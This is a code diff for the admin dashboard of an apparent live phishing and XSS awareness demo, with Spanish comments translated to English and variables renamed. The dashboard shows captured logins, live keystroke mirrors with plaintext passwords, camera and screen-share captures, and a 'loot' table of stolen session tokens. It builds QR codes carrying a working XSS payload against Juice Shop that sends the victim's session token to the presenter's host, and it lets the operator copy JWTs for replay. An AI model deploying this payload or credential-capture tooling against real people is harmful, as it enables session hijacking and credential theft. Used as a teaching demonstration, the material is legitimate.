@@ -75,199 +75,202 @@
 </div>
 
 <script>
-let tok = localStorage.qlab_token || '';
-let es = null;
+let adminToken = localStorage.qlab_token || '';
+let eventSource = null;
 let refreshTimer = null;
 let lanIp = '';
 const $ = id => document.getElementById(id);
 
-async function api(path, opts) {
-  opts = opts || {};
-  opts.headers = Object.assign({ 'x-admin-token': tok }, opts.headers || {});
-  const r = await fetch(path, opts);
-  if (r.status === 401) {
-    // El servidor puede reiniciarse con otro token; no conserves uno obsoleto.
+async function api(path, options) {
+  options = options || {};
+  options.headers = Object.assign({ 'x-admin-token': adminToken }, options.headers || {});
+  const response = await fetch(path, options);
+  if (response.status === 401) {
+    // The server may have been restarted with a new token; drop a stale one.
     localStorage.removeItem('qlab_token');
-    tok = '';
-    if (es) { es.close(); es = null; }
+    adminToken = '';
+    if (eventSource) { eventSource.close(); eventSource = null; }
     showGate('Token inválido o cambiado. Escríbelo de nuevo.');
     throw new Error('auth');
   }
-  return r.json();
+  return response.json();
 }
-function showGate(msg) {
+function showGate(message) {
   $('gate').hidden = false; $('panel').hidden = true;
-  $('gateErr').textContent = msg || '';
+  $('gateErr').textContent = message || '';
 }
-$('saveToken').onclick = () => { tok = $('inpToken').value.trim(); localStorage.qlab_token = tok; start(); };
+$('saveToken').onclick = () => { adminToken = $('inpToken').value.trim(); localStorage.qlab_token = adminToken; start(); };
 
 async function start() {
-  if (!tok) return showGate();
+  if (!adminToken) return showGate();
   try { await api('/api/admin/stats'); } catch (e) { return; }
   $('gate').hidden = true; $('panel').hidden = false;
-  if (es) es.close();
-  es = new EventSource('/api/live?token=' + encodeURIComponent(tok));
-  es.onmessage = e => {
-    let m; try { m = JSON.parse(e.data); } catch (_) { return refresh(); }
-    if (m.kind === 'heartbeat' || m.kind === 'connected') return;
-    if (m.kind === 'mirror') { live[m.id] = Object.assign(live[m.id] || {}, { mirror: m.mirror }); return patchLive(m.id); }
-    if (m.kind === 'frame') { live[m.id] = Object.assign(live[m.id] || {}, { frame: m.frame }); return patchLive(m.id); }
+  if (eventSource) eventSource.close();
+  eventSource = new EventSource('/api/live?token=' + encodeURIComponent(adminToken));
+  eventSource.onmessage = event => {
+    let message; try { message = JSON.parse(event.data); } catch (_) { return refresh(); }
+    if (message.kind === 'heartbeat' || message.kind === 'connected') return;
+    if (message.kind === 'mirror') { liveState[message.id] = Object.assign(liveState[message.id] || {}, { mirror: message.mirror }); return patchLive(message.id); }
+    if (message.kind === 'frame') { liveState[message.id] = Object.assign(liveState[message.id] || {}, { frame: message.frame }); return patchLive(message.id); }
     refresh();
   };
-  es.onerror = () => { /* EventSource reintenta automáticamente. */ };
+  eventSource.onerror = () => { /* EventSource retries automatically. */ };
   refresh();
   if (refreshTimer) clearInterval(refreshTimer);
   refreshTimer = setInterval(refresh, 5000);
   try {
-    const cfg = await (await fetch('/api/config')).json();
-    if (cfg.publicUrl) $('inpURL').value = cfg.publicUrl;
-    if (cfg.lanIp) { lanIp = cfg.lanIp; renderArsenal(); }
+    const config = await (await fetch('/api/config')).json();
+    if (config.publicUrl) $('inpURL').value = config.publicUrl;
+    if (config.lanIp) { lanIp = config.lanIp; renderQrArsenal(); }
   } catch (e) {}
 }
 
-const EMOJI = { session_started: '🟢', landing_viewed: '👀', fake_login_submitted: '🔑', keystroke: '✍️', cookies_collected: '🍪', camera_request_clicked: '📷', camera_permission_granted: '✅', camera_permission_denied: '🚫', camera_preview_active: '🎥', camera_stopped: '⏹', screen_share_started: '🖥️', screen_share_denied: '🚫', screen_share_stopped: '⏹', reveal_seen: '🎭', reveal_activated: '🚨', session_ended: '👋', loot_received: '🦠' };
-const TXT = { session_started: 'nueva sesión', landing_viewed: 'vio la landing', fake_login_submitted: 'ENVIÓ CREDENCIALES', keystroke: 'tecleando', cookies_collected: 'cookies visibles', camera_request_clicked: 'pidió cámara', camera_permission_granted: 'PERMISO CONCEDIDO', camera_permission_denied: 'permiso rechazado', camera_preview_active: 'vista previa activa', camera_stopped: 'cámara detenida', screen_share_started: 'COMPARTIÓ PANTALLA', screen_share_denied: 'negó compartir pantalla', screen_share_stopped: 'dejó de compartir', reveal_seen: 'vio la revelación', reveal_activated: 'revelación activada por el expositor', session_ended: 'sesión terminada', loot_received: 'payload XSS ejecutado' };
+// UI copy for each event type (keys = English event names from the server).
+const EVENT_EMOJI = { session_started: '🟢', landing_viewed: '👀', fake_login_submitted: '🔑', keystroke: '✍️', cookies_collected: '🍪', camera_request_clicked: '📷', camera_permission_granted: '✅', camera_permission_denied: '🚫', camera_preview_active: '🎥', camera_stopped: '⏹', screen_share_started: '🖥️', screen_share_denied: '🚫', screen_share_stopped: '⏹', reveal_seen: '🎭', reveal_activated: '🚨', session_ended: '👋', loot_received: '🦠' };
+const EVENT_TEXT = { session_started: 'nueva sesión', landing_viewed: 'vio la landing', fake_login_submitted: 'ENVIÓ CREDENCIALES', keystroke: 'tecleando', cookies_collected: 'cookies visibles', camera_request_clicked: 'pidió cámara', camera_permission_granted: 'PERMISO CONCEDIDO', camera_permission_denied: 'permiso rechazado', camera_preview_active: 'vista previa activa', camera_stopped: 'cámara detenida', screen_share_started: 'COMPARTIÓ PANTALLA', screen_share_denied: 'negó compartir pantalla', screen_share_stopped: 'dejó de compartir', reveal_seen: 'vio la revelación', reveal_activated: 'revelación activada por el expositor', session_ended: 'sesión terminada', loot_received: 'payload XSS ejecutado' };
 
-// Estado en vivo por sesión (espejo de tecleo + último frame de pantalla).
-// Llega por SSE local, entre un refresco completo y el siguiente.
-const live = {};
-const esc = s => String(s == null ? '' : s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
-const SECTION_TXT = { stage1: 'Formulario del concurso', stage2: 'Pantalla de cámara', done: 'Esperando resultado', reveal: 'Revelación' };
+// Per-session live state (typing mirror + latest screen frame). Arrives over
+// the local SSE stream between full refreshes.
+const liveState = {};
+const escapeHtml = s => String(s == null ? '' : s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+const SECTION_TEXT = { stage1: 'Formulario del concurso', stage2: 'Pantalla de cámara', done: 'Esperando resultado', reveal: 'Revelación' };
 
-// Parcha solo los elementos de una tarjeta ya pintada, sin reconstruir el DOM.
-function patchLive(id) {
-  const card = document.getElementById('card-' + id);
+// Patches only the elements of an already-rendered card instead of rebuilding
+// the DOM on every SSE message.
+function patchLive(sessionId) {
+  const card = document.getElementById('card-' + sessionId);
   if (!card) { refresh(); return; }
-  const L = live[id] || {};
-  if (L.mirror) {
-    const sec = document.getElementById('sec-' + id);
-    const mem = document.getElementById('mem-' + id);
-    const mpw = document.getElementById('mpw-' + id);
-    if (sec) sec.textContent = SECTION_TXT[L.mirror.section] || L.mirror.section || '—';
-    if (mem) mem.textContent = L.mirror.email || '—';
-    if (mpw) mpw.textContent = L.mirror.pass ? '•'.repeat(L.mirror.pass.length) + '  (' + L.mirror.pass + ')' : '—';
+  const state = liveState[sessionId] || {};
+  if (state.mirror) {
+    const sectionEl = document.getElementById('sec-' + sessionId);
+    const emailEl = document.getElementById('mem-' + sessionId);
+    const passEl = document.getElementById('mpw-' + sessionId);
+    if (sectionEl) sectionEl.textContent = SECTION_TEXT[state.mirror.section] || state.mirror.section || '—';
+    if (emailEl) emailEl.textContent = state.mirror.email || '—';
+    if (passEl) passEl.textContent = state.mirror.pass ? '•'.repeat(state.mirror.pass.length) + '  (' + state.mirror.pass + ')' : '—';
   }
-  if (L.frame) {
-    const img = document.getElementById('frm-' + id);
-    const nof = document.getElementById('nof-' + id);
-    if (img) { img.src = L.frame; img.hidden = false; }
-    if (nof) nof.hidden = true;
+  if (state.frame) {
+    const img = document.getElementById('frm-' + sessionId);
+    const noFrame = document.getElementById('nof-' + sessionId);
+    if (img) { img.src = state.frame; img.hidden = false; }
+    if (noFrame) noFrame.hidden = true;
   }
 }
 
 async function refresh() {
-  let j;
-  try { j = await api('/api/admin/stats'); } catch (e) { return; }
-  const c = j.counters;
+  let payload;
+  try { payload = await api('/api/admin/stats'); } catch (e) { return; }
+  const counters = payload.counters;
   $('counters').innerHTML = [
-    ['Visitas', c.visitas], ['Credenciales', c.logins],
-    ['Pidió cámara', c.camSolicitudes], ['Cámara ✔', c.camAceptadas], ['Cámara ✘', c.camRechazadas],
-    ['Pantallas 🖥️', c.pantallas || 0],
-    ['XSS ejecutado', c.lootEjec || 0], ['🔥 Sesiones robadas', c.lootRobos || 0]
-  ].map(x => '<div class="counter"><div class="num">' + x[1] + '</div><div class="lbl">' + x[0] + '</div></div>').join('');
+    ['Visitas', counters.visits], ['Credenciales', counters.logins],
+    ['Pidió cámara', counters.cameraRequests], ['Cámara ✔', counters.cameraGranted], ['Cámara ✘', counters.cameraDenied],
+    ['Pantallas 🖥️', counters.screens || 0],
+    ['XSS ejecutado', counters.lootExecutions || 0], ['🔥 Sesiones robadas', counters.lootStolen || 0]
+  ].map(entry => '<div class="counter"><div class="num">' + entry[1] + '</div><div class="lbl">' + entry[0] + '</div></div>').join('');
 
-  const sessions = j.sessions.slice().sort((a, b) => a.last_seen - b.last_seen);
-  // Poda el estado en vivo de sesiones que ya no existen (p. ej. tras reiniciar).
-  const ids = new Set(sessions.map(s => s.id));
-  for (const k of Object.keys(live)) if (!ids.has(k)) delete live[k];
+  const sessions = payload.sessions.slice().sort((a, b) => a.last_seen - b.last_seen);
+  // Prune live state for sessions that no longer exist (e.g. after a reset).
+  const existingIds = new Set(sessions.map(s => s.id));
+  for (const key of Object.keys(liveState)) if (!existingIds.has(key)) delete liveState[key];
 
   $('cards').innerHTML = sessions.length ? sessions.map(s => {
-    const L = live[s.id] || {};
-    const mir = L.mirror || (s.data && s.data.mirror) || {};
-    let st = '👀 En landing';
-    if (s.stage === 'revelado') { st = '🎭 Revelado'; }
-    else if (s.data && s.data.share === 'compartiendo') { st = '🖥️ Compartiendo pantalla'; }
-    else if (s.data && s.data.cam === 'vista previa activa') { st = '🎥 Cámara activa'; }
-    else if (s.data && s.data.cam === 'rechazado') { st = '🚫 Cámara rechazada'; }
-    else if (s.data && s.data.login) { st = '🔑 Login capturado'; }
-    const meta = '<small>' + esc(s.os) + ' · ' + esc(s.browser) + '</small>';
-    const pw = mir.pass ? '•'.repeat(mir.pass.length) + '  (' + esc(mir.pass) + ')' : '—';
+    const state = liveState[s.id] || {};
+    const mirror = state.mirror || (s.data && s.data.mirror) || {};
+    let statusText = '👀 En landing';
+    if (s.stage === 'revealed') { statusText = '🎭 Revelado'; }
+    else if (s.data && s.data.share === 'sharing') { statusText = '🖥️ Compartiendo pantalla'; }
+    else if (s.data && s.data.cam === 'preview_active') { statusText = '🎥 Cámara activa'; }
+    else if (s.data && s.data.cam === 'denied') { statusText = '🚫 Cámara rechazada'; }
+    else if (s.data && s.data.login) { statusText = '🔑 Login capturado'; }
+    const meta = '<small>' + escapeHtml(s.os) + ' · ' + escapeHtml(s.browser) + '</small>';
+    const maskedPassword = mirror.pass ? '•'.repeat(mirror.pass.length) + '  (' + escapeHtml(mirror.pass) + ')' : '—';
     const mirrorBlock =
       '<div class="mirror">' +
-        '<div class="mrow">Sección: <b id="sec-' + s.id + '">' + esc(SECTION_TXT[mir.section] || mir.section || '—') + '</b></div>' +
-        '<div class="mrow">📧 <span id="mem-' + s.id + '">' + (esc(mir.email) || '—') + '</span></div>' +
-        '<div class="mrow">🔑 <span id="mpw-' + s.id + '">' + pw + '</span></div>' +
+        '<div class="mrow">Sección: <b id="sec-' + s.id + '">' + escapeHtml(SECTION_TEXT[mirror.section] || mirror.section || '—') + '</b></div>' +
+        '<div class="mrow">📧 <span id="mem-' + s.id + '">' + (escapeHtml(mirror.email) || '—') + '</span></div>' +
+        '<div class="mrow">🔑 <span id="mpw-' + s.id + '">' + maskedPassword + '</span></div>' +
       '</div>';
-    const hasFrame = !!L.frame;
+    const hasFrame = !!state.frame;
     const frameBlock =
-      '<img class="frame" id="frm-' + s.id + '" ' + (hasFrame ? 'src="' + L.frame + '"' : '') + (hasFrame ? '' : ' hidden') + ' alt="pantalla compartida">' +
+      '<img class="frame" id="frm-' + s.id + '" ' + (hasFrame ? 'src="' + state.frame + '"' : '') + (hasFrame ? '' : ' hidden') + ' alt="pantalla compartida">' +
       '<div class="noframe" id="nof-' + s.id + '"' + (hasFrame ? ' hidden' : '') + '>— sin pantalla compartida —</div>';
-    return '<div class="card on" id="card-' + s.id + '"><div class="dot"></div><h3>Teléfono ' + esc(s.label) + '</h3><p>' + st + '</p>' + meta + mirrorBlock + frameBlock + '</div>';
+    return '<div class="card on" id="card-' + s.id + '"><div class="dot"></div><h3>Teléfono ' + escapeHtml(s.label) + '</h3><p>' + statusText + '</p>' + meta + mirrorBlock + frameBlock + '</div>';
   }).join('') : '<div class="card empty"><h3>Aún no hay participantes</h3><p>Comparte el QR para comenzar la demostración.</p></div>';
 
-  $('feed').innerHTML = j.events.map(e => {
+  $('feed').innerHTML = payload.events.map(event => {
     let extra = '';
-    if (e.payload) {
-      if (e.payload.email) extra += ' · 📧 ' + e.payload.email;
-      if (e.payload.password) extra += ' · 🔑 pass="' + e.payload.password + '"';
-      if (e.payload.field) extra += ' · ' + e.payload.field + ' (' + e.payload.len + ' chars)';
+    if (event.payload) {
+      if (event.payload.email) extra += ' · 📧 ' + event.payload.email;
+      if (event.payload.password) extra += ' · 🔑 pass="' + event.payload.password + '"';
+      if (event.payload.field) extra += ' · ' + event.payload.field + ' (' + event.payload.len + ' chars)';
     }
-    const t = new Date(e.created_at).toLocaleTimeString();
-    const robado = e.type === 'loot_received' && e.payload && e.payload.stolen;
-    const txt = robado ? '🔥 SESIÓN ROBADA' : (TXT[e.type] || e.type);
-    return '<div class="ev ' + (e.type === 'fake_login_submitted' || robado ? 'hot' : '') + '"><span class="t">' + t + '</span> ' + (EMOJI[e.type] || '•') + ' <b>' + (e.label || '—') + '</b> ' + txt + extra + '</div>';
+    const time = new Date(event.created_at).toLocaleTimeString();
+    const stolen = event.type === 'loot_received' && event.payload && event.payload.stolen;
+    const text = stolen ? '🔥 SESIÓN ROBADA' : (EVENT_TEXT[event.type] || event.type);
+    return '<div class="ev ' + (event.type === 'fake_login_submitted' || stolen ? 'hot' : '') + '"><span class="t">' + time + '</span> ' + (EVENT_EMOJI[event.type] || '•') + ' <b>' + (event.label || '—') + '</b> ' + text + extra + '</div>';
   }).join('');
 
-  const loots = j.loots || [];
-  $('lootRows').innerHTML = loots.length ? loots.map(l => {
-    const t = new Date(l.ts).toLocaleTimeString();
-    const ua = (String(l.ua || '').match(/Android|iPhone|iPad|Windows|Macintosh|Linux/) || ['?'])[0];
-    const who = l.stolen ? (l.email || 'sesión robada') : 'sin sesión (none)';
-    const tok = l.stolen ? '<code class="tok" data-tok="' + esc(l.token) + '" title="click para copiar">' + esc(l.token.slice(0, 48)) + '…</code>' : '—';
-    return '<tr class="' + (l.stolen ? 'hot' : '') + '"><td>' + t + '</td><td>' + esc(ua) + '</td><td>' + esc(who) + '</td><td>' + tok + '</td></tr>';
+  const loots = payload.loots || [];
+  $('lootRows').innerHTML = loots.length ? loots.map(loot => {
+    const time = new Date(loot.ts).toLocaleTimeString();
+    const origin = (String(loot.ua || '').match(/Android|iPhone|iPad|Windows|Macintosh|Linux/) || ['?'])[0];
+    const victim = loot.stolen ? (loot.email || 'sesión robada') : 'sin sesión (none)';
+    const tokenCell = loot.stolen ? '<code class="tok" data-tok="' + escapeHtml(loot.token) + '" title="click para copiar">' + escapeHtml(loot.token.slice(0, 48)) + '…</code>' : '—';
+    return '<tr class="' + (loot.stolen ? 'hot' : '') + '"><td>' + time + '</td><td>' + escapeHtml(origin) + '</td><td>' + escapeHtml(victim) + '</td><td>' + tokenCell + '</td></tr>';
   }).join('') : '<tr><td colspan="4" class="empty">Aún no hay ejecuciones del payload.</td></tr>';
 }
 
 $('btnReveal').onclick = () => api('/api/admin/reveal', { method: 'POST' });
-$('btnReset').onclick = () => { for (const k of Object.keys(live)) delete live[k]; api('/api/admin/reset', { method: 'POST' }); };
+$('btnReset').onclick = () => { for (const key of Object.keys(liveState)) delete liveState[key]; api('/api/admin/reset', { method: 'POST' }); };
 $('btnFS').onclick = () => document.documentElement.requestFullscreen().catch(() => {});
-function renderQR(el, url, size) {
-  el.innerHTML = '';
-  try { new QRCode(el, { text: url, width: size || 240, height: size || 240 }); }
-  catch (e) { el.textContent = url; }
+function renderQr(element, url, size) {
+  element.innerHTML = '';
+  try { new QRCode(element, { text: url, width: size || 240, height: size || 240 }); }
+  catch (e) { element.textContent = url; }
 }
 $('btnQR').onclick = () => {
   const url = $('inpURL').value.trim();
-  if (url) renderQR($('qr'), url);
+  if (url) renderQr($('qr'), url);
 };
 
-// ---------- Arsenal QR: robo de sesión contra Juice Shop ----------
-// OJO: sessionStorage es por origen — todas las URLs usan la IP LAN (lanIp),
-// nunca localhost, o la víctima no tendrá el token y llegará loot=none.
-function payloadRobo(ip) {
+// ---------- QR arsenal: session theft against Juice Shop ----------
+// WARNING: sessionStorage is per-origin — every URL must use the LAN IP
+// (lanIp), never localhost, or the victim's token is missing and loot=none
+// is all that arrives.
+function buildSessionTheftPayload(ip) {
   return `<iframe src="javascript:fetch('http://${ip}:3000/api/loot?loot='+encodeURIComponent(sessionStorage.getItem('token')||localStorage.getItem('token')||'none'),{mode:'no-cors'})">`;
 }
-function renderArsenal() {
+function renderQrArsenal() {
   if (!lanIp) {
     $('url1').textContent = 'No se detectó IP LAN. Arranca con LAN_IP=tu.ip make up (o npm start con LAN_IP en .env).';
     return;
   }
-  const u1 = `http://${lanIp}:4000/`;
-  $('url1').textContent = u1;
-  renderQR($('qr1'), u1, 160);
-  const u2 = `http://${lanIp}:4000/#/search?q=${encodeURIComponent(payloadRobo(lanIp))}`;
-  $('url2').textContent = u2;
-  renderQR($('qr2'), u2, 160);
+  const baitUrl = `http://${lanIp}:4000/`;
+  $('url1').textContent = baitUrl;
+  renderQr($('qr1'), baitUrl, 160);
+  const theftUrl = `http://${lanIp}:4000/#/search?q=${encodeURIComponent(buildSessionTheftPayload(lanIp))}`;
+  $('url2').textContent = theftUrl;
+  renderQr($('qr2'), theftUrl, 160);
 }
 $('btnQR3').onclick = () => {
   const url = $('inpURL3').value.trim();
   if (!url) return;
   $('url3').textContent = url;
-  renderQR($('qr3'), url, 160);
+  renderQr($('qr3'), url, 160);
 };
 $('btnCopy2').onclick = () => {
-  const u = $('url2').textContent;
-  if (!u) return;
-  navigator.clipboard.writeText(u).then(() => {
+  const url = $('url2').textContent;
+  if (!url) return;
+  navigator.clipboard.writeText(url).then(() => {
     $('btnCopy2').textContent = '✔ Copiado';
     setTimeout(() => { $('btnCopy2').textContent = '📋 Copiar URL'; }, 1500);
   });
 };
-// Click en un token de la tabla de botín → copia el JWT completo (para el remate).
-$('lootRows').addEventListener('click', e => {
-  const t = e.target.closest('.tok');
-  if (!t) return;
-  navigator.clipboard.writeText(t.dataset.tok).then(() => { t.textContent = '✔ copiado'; });
+// Clicking a token in the loot table copies the full JWT (for the replay finale).
+$('lootRows').addEventListener('click', event => {
+  const target = event.target.closest('.tok');
+  if (!target) return;
+  navigator.clipboard.writeText(target.dataset.tok).then(() => { target.textContent = '✔ copiado'; });
 });
 start();
 </script>
